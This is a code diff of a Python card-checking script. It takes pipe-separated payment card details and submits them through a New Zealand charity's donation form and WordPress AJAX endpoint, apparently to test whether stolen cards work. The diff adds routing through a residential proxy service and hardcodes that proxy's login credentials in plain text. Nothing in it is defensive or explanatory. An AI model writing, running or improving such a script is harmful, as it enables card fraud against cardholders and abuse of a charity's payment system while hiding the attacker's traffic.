@@ -1,6 +1,10 @@
 import requests,re
 import random
+from proxy import reqproxy, make_request
 def Tele(ccx):
+	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
+	session, ip = reqproxy(proxy_str)
+	#print(f"IP Address: {ip}")
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
@@ -30,7 +34,7 @@ def Tele(ccx):
 	    'sec-ch-ua-platform': '"Android"',
 	}
 	
-	response = requests.get('https://ourlittlevillage.org.nz/campaigns/one-off-donation/donate/', headers=headers)
+	response = session.get('https://ourlittlevillage.org.nz/campaigns/one-off-donation/donate/', headers=headers)
 	
 	form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
 	donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
@@ -93,7 +97,7 @@ def Tele(ccx):
 	    'form_action': 'make_donation',
 	}
 	
-	response = requests.post('https://ourlittlevillage.org.nz/wp-admin/admin-ajax.php', headers=headers, data=data)
+	response = session.post('https://ourlittlevillage.org.nz/wp-admin/admin-ajax.php', headers=headers, data=data)
 	
 	try:
 		scrt = response.json().get('secret')
